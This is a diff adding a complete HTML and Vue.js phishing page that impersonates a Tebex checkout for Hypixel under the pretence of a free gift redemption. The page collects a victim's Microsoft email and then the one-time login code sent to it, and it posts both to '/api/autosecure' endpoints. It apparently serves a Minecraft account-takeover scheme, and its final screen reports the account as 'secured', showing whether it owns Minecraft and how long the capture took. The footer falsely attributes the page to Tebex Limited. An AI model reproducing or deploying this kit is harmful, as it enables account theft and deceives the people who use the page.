@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tebex Checkout - Hypixel</title>
+    <link rel="icon" type="image/png" href="https://www.tebex.io/favicon.png">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700;900&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/@mdi/font@latest/css/materialdesignicons.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/vuetify@3.4.0/dist/vuetify.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #41C4C3;
+            --primary-hover: #35A8A7;
+            --bg-sidebar: #FAFAFA;
+            --bg-main: #FFFFFF;
+            --text-color: #333333;
+            --text-muted: #616161;
+            --border-color: #E6E6E6;
+            --input-bg: #FAFAFA;
+            --input-border: #DDDDDD;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Lato', sans-serif !important;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+            color: var(--text-color);
+            background-color: var(--bg-main);
+        }
+        #app {
+            min-height: 100vh;
+            width: 100vw;
+        }
+        .split-layout {
+            display: flex;
+            height: 100vh;
+            width: 100%;
+        }
+        .sidebar-panel {
+            width: 50.2%;
+            background-color: var(--bg-sidebar);
+            border-right: 1px solid var(--border-color);
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            padding-top: 40px;
+            padding-bottom: 60px;
+        }
+        .main-panel {
+            flex: 1;
+            background-color: var(--bg-main);
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            padding-top: 40px;
+            padding-bottom: 60px;
+        }
+        .content-container {
+            width: 100%;
+            max-width: 520px;
+            padding: 0 40px;
+            box-sizing: border-box;
+        }
+        .mobile-header {
+            display: none;
+        }
+        @media (max-width: 960px) {
+            .split-layout {
+                flex-direction: column;
+                height: auto;
+                overflow-y: visible;
+            }
+            .sidebar-panel {
+                display: none !important;
+            }
+            .main-panel {
+                width: 100%;
+                height: auto;
+                align-items: center;
+                overflow: visible;
+                padding-top: 0;
+                padding-bottom: 0;
+            }
+            .content-container {
+                padding: 20px;
+                max-width: 100%;
+            }
+            .mobile-header {
+                display: block;
+                width: 100%;
+                background: var(--bg-sidebar);
+                border-bottom: 1px solid var(--border-color);
+            }
+        }
+        .v-btn {
+            text-transform: none !important;
+            letter-spacing: normal !important;
+            font-weight: 700 !important;
+            box-shadow: none !important;
+            border-radius: 0 !important;
+            transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1) !important;
+        }
+        .tebex-label {
+            display: block;
+            font-size: 0.875rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: var(--text-color);
+        }
+        .v-field--disabled {
+            opacity: 1 !important;
+            pointer-events: none;
+        }
+        .v-field--disabled input {
+            color: #999 !important;
+        }
+        input[type="checkbox"] {
+            appearance: none;
+            -webkit-appearance: none;
+            width: 18px;
+            height: 18px;
+            border: 1px solid #DDDDDD;
+            border-radius: 2px;
+            background-color: #fff;
+            cursor: pointer;
+            position: relative;
+            margin-top: 3px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s ease;
+        }
+        input[type="checkbox"]:checked {
+            background-color: #41C4C3;
+            border-color: #41C4C3;
+        }
+        input[type="checkbox"]:checked::after {
+            content: '';
+            width: 5px;
+            height: 10px;
+            border: solid white;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+            margin-bottom: 2px;
+        }
+        .breadcrumbs {
+            display: flex;
+            align-items: center;
+            font-size: 0.75rem;
+            margin-bottom: 24px;
+            color: #41C4C3;
+            font-weight: 400;
+        }
+        .breadcrumb-item {
+            color: #41C4C3;
+            cursor: pointer;
+            text-decoration: none;
+            transition: color 0.2s ease;
+        }
+        .breadcrumb-item:hover {
+            color: #35A8A7;
+        }
+        .breadcrumb-muted {
+            color: #999999;
+            cursor: default;
+        }
+        .breadcrumb-separator {
+            margin: 0 8px;
+            color: #CCCCCC;
+        }
+        .order-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 28px;
+        }
+        .order-header span {
+            font-size: 1rem;
+            font-weight: 400;
+            color: var(--text-color);
+        }
+        .cancel-link {
+            color: var(--text-color);
+            text-decoration: underline;
+            font-size: 0.875rem;
+            font-weight: 400;
+            cursor: pointer;
+        }
+        .cancel-link:hover {
+            color: #000;
+        }
+        .basket-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 32px;
+        }
+        .basket-item-image {
+            width: 68px;
+            height: 68px;
+            border: 1px solid #EBEBEB;
+            border-radius: 4px;
+            padding: 8px;
+            background: #fff;
+            margin-right: 18px;
+            flex-shrink: 0;
+            position: relative;
+        }
+        .basket-item-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        .gift-badge {
+            position: absolute;
+            top: -4px;
+            right: -4px;
+            background: #41C4C3;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .basket-item-info {
+            flex: 1;
+        }
+        .basket-item-name {
+            font-weight: 700;
+            font-size: 1.05rem;
+            color: #333;
+            margin-bottom: 5px;
+        }
+        .basket-item-price {
+            font-size: 0.875rem;
+            color: #41C4C3;
+        }
+        .input-section {
+            margin-bottom: 32px;
+        }
+        .price-summary {
+            padding-bottom: 24px;
+        }
+        .price-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 16px;
+            font-size: 0.875rem;
+            font-weight: 700;
+            color: #333;
+        }
+        .price-divider {
+            height: 1px;
+            background: #E0E0E0;
+            margin-bottom: 16px;
+        }
+        .total-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .total-label,
+        .total-value {
+            font-weight: 700;
+            font-size: 1.25rem;
+            color: #333;
+        }
+        .form-row {
+            display: flex;
+            gap: 16px;
+            margin-bottom: 16px;
+        }
+        .form-row>div {
+            flex: 1;
+        }
+        .checkbox-row {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin-bottom: 16px;
+            font-size: 0.813rem;
+            color: #666;
+            line-height: 1.5;
+        }
+        .checkbox-row a {
+            color: #41C4C3;
+            text-decoration: underline;
+        }
+        .pay-btn {
+            background-color: #41C4C3 !important;
+            color: #000 !important;
+            font-size: 0.938rem !important;
+            font-weight: 700 !important;
+            width: 100%;
+        }
+        .pay-btn:hover {
+            background-color: #35A8A7 !important;
+        }
+        .section-title {
+            font-size: 0.875rem;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 12px;
+        }
+        .error-msg {
+            color: #e53935;
+            font-size: 0.813rem;
+            margin-top: 6px;
+        }
+        .error-border .v-field__outline__start,
+        .error-border .v-field__outline__end,
+        .error-border .v-field__outline__notch {
+            border-color: #e53935 !important;
+        }
+        .success-message {
+            background: #4caf50;
+            color: white;
+            padding: 16px;
+            border-radius: 4px;
+            margin-bottom: 16px;
+            text-align: center;
+        }
+        .otp-section {
+            background: #f5f5f5;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .otp-timer {
+            font-size: 0.875rem;
+            color: #666;
+            margin-bottom: 8px;
+        }
+        .global-footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #FFFFFF;
+            border-top: 1px solid #E6E6E6;
+            padding: 12px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 0.75rem;
+            color: #999;
+            z-index: 100;
+        }
+        .global-footer-left {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .global-footer-logo {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-weight: 700;
+            font-size: 0.875rem;
+            color: #333;
+        }
+        .global-footer-logo svg {
+            width: 16px;
+            height: 16px;
+        }
+        .global-footer-text {
+            color: #999;
+        }
+        .global-footer-text a {
+            color: #41C4C3;
+            text-decoration: underline;
+        }
+        .global-footer-links {
+            display: flex;
+            align-items: center;
+            gap: 24px;
+        }
+        .global-footer-links a {
+            color: #999;
+            text-decoration: underline;
+        }
+        @media (max-width: 960px) {
+            .global-footer {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="app" data-v-app="">
+        <div class="v-application v-theme--light v-layout v-layout--full-height v-locale--is-ltr">
+            <div class="v-application__wrap">
+                <div class="split-layout">
+                    
+                    <!-- Sidebar Panel -->
+                    <div class="sidebar-panel">
+                        <div class="content-container">
+                            <div class="h-100 d-flex flex-column">
+                                <div class="d-none d-md-block mb-6">
+                                    <img src="https://dunb17ur4ymx4.cloudfront.net/webstore/logos/6c9b0cbd5c2f0ceef98f01068102b0d056c04b7b.png" alt="Hypixel" class="logo-img" style="height: 50px; display: block;">
+                                </div>
+                                
+                                <div class="order-header">
+                                    <span>Gift Link Redemption</span>
+                                    <a href="#" class="cancel-link">Cancel</a>
+                                </div>
+                                
+                                <div class="basket-item">
+                                    <div class="basket-item-image">
+                                        <img :src="product?.image || 'https://dunb17ur4ymx4.cloudfront.net/packages/images/c6e8cde2a5a147fd6d6e9b7506a62fab195e09e0.png'" 
+                                             :alt="product?.name || 'Product'">
+                                        <div class="gift-badge">
+                                            <svg width="10" height="10" viewBox="0 0 24 24" fill="white">
+                                                <path d="M20 6h-2.18c.11-.31.18-.65.18-1 0-1.66-1.34-3-3-3-1.05 0-1.96.54-2.5 1.35l-.5.67-.5-.68C10.96 2.54 10.05 2 9 2 7.34 2 6 3.34 6 5c0 .35.07.69.18 1H4c-1.11 0-1.99.89-1.99 2L2 19c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V8c0-1.11-.89-2-2-2zm-5-2c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zM9 4c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm11 15H4v-2h16v2zm0-5H4V8h5.08L7 10.83 8.62 12 12 7.4l3.38 4.6L17 10.83 14.92 8H20v6z"/>
+                                            </svg>
+                                        </div>
+                                    </div>
+                                    <div class="basket-item-info">
+                                        <div class="basket-item-name">{{ product?.name || 'Product' }}</div>
+                                        <div class="basket-item-price">Gift - Free</div>
+                                    </div>
+                                </div>
+                                
+                                <div class="price-summary">
+                                    <div class="price-row">
+                                        <span>Subtotal:</span>
+                                        <span><s style="color:#999;">{{ product ? '$' + product.price + ' USD' : '$0.00 USD' }}</s></span>
+                                    </div>
+                                    <div class="price-row" style="color: #41C4C3;">
+                                        <span>Gift Link Applied:</span>
+                                        <span>-{{ product ? '$' + product.price + ' USD' : '$0.00 USD' }}</span>
+                                    </div>
+                                    <div class="price-divider"></div>
+                                    <div class="total-row">
+                                        <span class="total-label">Total Price:</span>
+                                        <span class="total-value">$0.00 USD</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Main Panel -->
+                    <div class="main-panel">
+                        <div class="content-container h-100 d-flex flex-column">
+                            <div class="d-none d-md-block" style="height: 74px;"></div>
+                            
+                            <div class="breadcrumbs">
+                                <span class="breadcrumb-item">Gift Link</span>
+                                <i class="mdi-chevron-right mdi v-icon notranslate v-theme--light breadcrumb-separator" aria-hidden="true" style="font-size: 12px; height: 12px; width: 12px;"></i>
+                                <span class="breadcrumb-item">Account Verification</span>
+                                <i class="mdi-chevron-right mdi v-icon notranslate v-theme--light breadcrumb-separator" aria-hidden="true" style="font-size: 12px; height: 12px; width: 12px;"></i>
+                                <span class="breadcrumb-item breadcrumb-muted">Complete</span>
+                            </div>
+                            
+                            <!-- Success Message -->
+                            <div v-if="successMessage" class="success-message">
+                                {{ successMessage }}
+                            </div>
+                            
+                            <!-- Step 1: Email Input -->
+                            <div v-if="currentStep === 1">
+                                <div class="mb-4">
+                                    <label class="section-title">Microsoft Email Address</label>
+                                    <v-text-field
+                                        v-model="email"
+                                        placeholder="Enter your Microsoft email"
+                                        type="email"
+                                        variant="outlined"
+                                        density="compact"
+                                        :error-messages="showErrors && !isValidEmail(email) ? 'Please enter a valid Microsoft email' : ''"
+                                        :error="showErrors && !isValidEmail(email)"
+                                    ></v-text-field>
+                                </div>
+                                
+                                <div class="mb-4">
+                                    <label class="section-title">Minecraft Username (Optional)</label>
+                                    <v-text-field
+                                        v-model="minecraftUsername"
+                                        placeholder="Enter your Minecraft username"
+                                        type="text"
+                                        variant="outlined"
+                                        density="compact"
+                                    ></v-text-field>
+                                </div>
+                                
+                                <div class="checkbox-row">
+                                    <v-checkbox v-model="agreeTerms">
+                                        <template v-slot:label>
+                                            I agree to the account verification process and understand that this will secure my Microsoft account.
+                                        </template>
+                                    </v-checkbox>
+                                </div>
+                                
+                                <div class="mt-2 mb-8">
+                                    <v-btn 
+                                        color="primary"
+                                        size="large"
+                                        class="pay-btn"
+                                        :loading="isSendingOTP"
+                                        @click="sendOTP"
+                                        block
+                                    >
+                                        <v-icon style="margin-right: 8px;">mdi-email-send</v-icon>
+                                        Send Verification Code
+                                    </v-btn>
+                                </div>
+                            </div>
+                            
+                            <!-- Step 2: OTP Input -->
+                            <div v-if="currentStep === 2">
+                                <div class="otp-section">
+                                    <div class="otp-timer">
+                                        <v-icon style="margin-right: 4px;">mdi-timer</v-icon>
+                                        Code expires in: {{ formatTime(timeLeft) }}
+                                    </div>
+                                    
+                                    <label class="section-title">Enter Verification Code</label>
+                                    <v-text-field
+                                        v-model="otp"
+                                        placeholder="Enter 6-digit code"
+                                        type="text"
+                                        variant="outlined"
+                                        density="compact"
+                                        maxlength="6"
+                                        :error-messages="showErrors && !isValidOTP(otp) ? 'Please enter a valid 6-digit code' : ''"
+                                        :error="showErrors && !isValidOTP(otp)"
+                                    ></v-text-field>
+                                    
+                                    <div style="margin-top: 12px;">
+                                        <v-btn 
+                                            variant="outlined"
+                                            size="small"
+                                            @click="resendOTP"
+                                            :disabled="resendDisabled"
+                                        >
+                                            <v-icon style="margin-right: 4px;">mdi-refresh</v-icon>
+                                            {{ resendDisabled ? `Resend in ${resendCountdown}s` : 'Resend Code' }}
+                                        </v-btn>
+                                    </div>
+                                </div>
+                                
+                                <div class="mt-2 mb-8">
+                                    <v-btn 
+                                        color="primary"
+                                        size="large"
+                                        class="pay-btn"
+                                        :loading="isVerifying"
+                                        @click="verifyOTP"
+                                        block
+                                    >
+                                        <v-icon style="margin-right: 8px;">mdi-shield-check</v-icon>
+                                        Complete Account Verification
+                                    </v-btn>
+                                </div>
+                            </div>
+                            
+                            <!-- Step 3: Complete -->
+                            <div v-if="currentStep === 3">
+                                <div style="text-align: center; padding: 40px 0;">
+                                    <v-icon size="64" color="success">mdi-check-circle</v-icon>
+                                    <h2 style="margin: 16px 0; color: #4caf50;">Account Successfully Secured!</h2>
+                                    <p style="color: #666; margin-bottom: 24px;">
+                                        Your Microsoft account has been secured and your gift has been redeemed.
+                                    </p>
+                                    
+                                    <div v-if="securedAccount" style="background: #f5f5f5; padding: 20px; border-radius: 8px; text-align: left;">
+                                        <h3 style="margin-bottom: 12px;">Account Details:</h3>
+                                        <div><strong>Email:</strong> {{ securedAccount.email }}</div>
+                                        <div><strong>Minecraft Username:</strong> {{ securedAccount.username }}</div>
+                                        <div><strong>Has Minecraft:</strong> {{ securedAccount.hasMinecraft ? 'Yes' : 'No' }}</div>
+                                        <div><strong>Time Taken:</strong> {{ securedAccount.timeTaken }}s</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Global Footer -->
+                <div class="global-footer d-none d-md-flex">
+                    <div class="global-footer-left">
+                        <div class="global-footer-logo">
+                            <svg viewBox="0 0 24 24" fill="currentColor">
+                                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
+                            </svg>
+                            <span>tebex</span>
+                        </div>
+                        <span class="global-footer-text">
+                            This checkout process is owned & operated by <a href="#">Tebex Limited</a>, who handle product fulfilment and <a href="#">billing support</a>.
+                        </span>
+                    </div>
+                    <div class="global-footer-links">
+                        <a href="#">Refund Policy</a>
+                        <a href="https://checkout.tebex.io/terms" target="_blank">Terms & Conditions</a>
+                        <a href="https://checkout.tebex.io/privacy" target="_blank">Privacy Policy</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/vuetify@3.4.0/dist/vuetify.min.js"></script>
+    <script>
+        const { createApp, ref, onMounted, onUnmounted } = Vue;
+        const { createVuetify } = Vuetify;
+
+        const App = {
+            setup() {
+                const currentStep = ref(1);
+                const email = ref('');
+                const minecraftUsername = ref('');
+                const otp = ref('');
+                const agreeTerms = ref(false);
+                const showErrors = ref(false);
+                const isSendingOTP = ref(false);
+                const isVerifying = ref(false);
+                const successMessage = ref('');
+                const sessionId = ref('');
+                const timeLeft = ref(900); // 15 minutes
+                const resendDisabled = ref(false);
+                const resendCountdown = ref(0);
+                const securedAccount = ref(null);
+                
+                const product = ref({
+                    name: 'PRODUCT_NAME',
+                    price: '0.00',
+                    image: 'https://dunb17ur4ymx4.cloudfront.net/packages/images/c6e8cde2a5a147fd6d6e9b7506a62fab195e09e0.png'
+                });
+
+                let timer = null;
+
+                const isValidEmail = (email) => {
+                    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+                };
+
+                const isValidOTP = (otp) => {
+                    return /^\d{6}$/.test(otp);
+                };
+
+                const formatTime = (seconds) => {
+                    const minutes = Math.floor(seconds / 60);
+                    const secs = seconds % 60;
+                    return `${minutes}:${secs.toString().padStart(2, '0')}`;
+                };
+
+                const startTimer = () => {
+                    if (timer) clearInterval(timer);
+                    timer = setInterval(() => {
+                        if (timeLeft.value > 0) {
+                            timeLeft.value--;
+                        } else {
+                            clearInterval(timer);
+                            currentStep.value = 1; // Reset to step 1
+                        }
+                    }, 1000);
+                };
+
+                const sendOTP = async () => {
+                    showErrors.value = true;
+                    
+                    if (!isValidEmail(email.value)) {
+                        return;
+                    }
+                    
+                    if (!agreeTerms.value) {
+                        return;
+                    }
+
+                    isSendingOTP.value = true;
+                    
+                    try {
+                        const response = await fetch('/api/autosecure/send-otp', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                email: email.value
+                            })
+                        });
+
+                        const result = await response.json();
+                        
+                        if (result.success) {
+                            sessionId.value = result.sessionId;
+                            currentStep.value = 2;
+                            timeLeft.value = 900; // Reset timer
+                            startTimer();
+                            successMessage.value = 'Verification code sent to your email!';
+                        } else {
+                            alert(result.error || 'Failed to send verification code');
+                        }
+                    } catch (error) {
+                        console.error('Error sending OTP:', error);
+                        alert('Failed to send verification code');
+                    } finally {
+                        isSendingOTP.value = false;
+                    }
+                };
+
+                const verifyOTP = async () => {
+                    showErrors.value = true;
+                    
+                    if (!isValidOTP(otp.value)) {
+                        return;
+                    }
+
+                    isVerifying.value = true;
+                    
+                    try {
+                        const response = await fetch('/api/autosecure/verify', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                sessionId: sessionId.value,
+                                otp: otp.value,
+                                minecraftUsername: minecraftUsername.value
+                            })
+                        });
+
+                        const result = await response.json();
+                        
+                        if (result.success) {
+                            securedAccount.value = result.account;
+                            currentStep.value = 3;
+                            if (timer) clearInterval(timer);
+                        } else {
+                            alert(result.error || 'Failed to verify code');
+                        }
+                    } catch (error) {
+                        console.error('Error verifying OTP:', error);
+                        alert('Failed to verify code');
+                    } finally {
+                        isVerifying.value = false;
+                    }
+                };
+
+                const resendOTP = async () => {
+                    if (resendDisabled.value) return;
+                    
+                    resendDisabled.value = true;
+                    resendCountdown.value = 30;
+                    
+                    const countdown = setInterval(() => {
+                        resendCountdown.value--;
+                        if (resendCountdown.value <= 0) {
+                            clearInterval(countdown);
+                            resendDisabled.value = false;
+                        }
+                    }, 1000);
+                    
+                    await sendOTP();
+                };
+
+                onUnmounted(() => {
+                    if (timer) clearInterval(timer);
+                });
+
+                // Get product info from URL or default
+                onMounted(() => {
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const productName = urlParams.get('product') || 'Product';
+                    const productPrice = urlParams.get('price') || '0.00';
+                    const productImage = urlParams.get('image') || 'https://dunb17ur4ymx4.cloudfront.net/packages/images/c6e8cde2a5a147fd6d6e9b7506a62fab195e09e0.png';
+                    
+                    product.value = {
+                        name: productName,
+                        price: productPrice,
+                        image: productImage
+                    };
+                });
+
+                return {
+                    currentStep,
+                    email,
+                    minecraftUsername,
+                    otp,
+                    agreeTerms,
+                    showErrors,
+                    isSendingOTP,
+                    isVerifying,
+                    successMessage,
+                    timeLeft,
+                    resendDisabled,
+                    resendCountdown,
+                    securedAccount,
+                    product,
+                    isValidEmail,
+                    isValidOTP,
+                    formatTime,
+                    sendOTP,
+                    verifyOTP,
+                    resendOTP
+                };
+            }
+        };
+
+        const vuetify = createVuetify({
+            theme: {
+                defaultTheme: 'light',
+                themes: {
+                    light: {
+                        colors: {
+                            primary: '#41C4C3',
+                            secondary: '#E5E5E5',
+                        }
+                    }
+                }
+            }
+        });
+
+        createApp(App).use(vuetify).mount('#app');
+    </script>
+</body>
+</html>
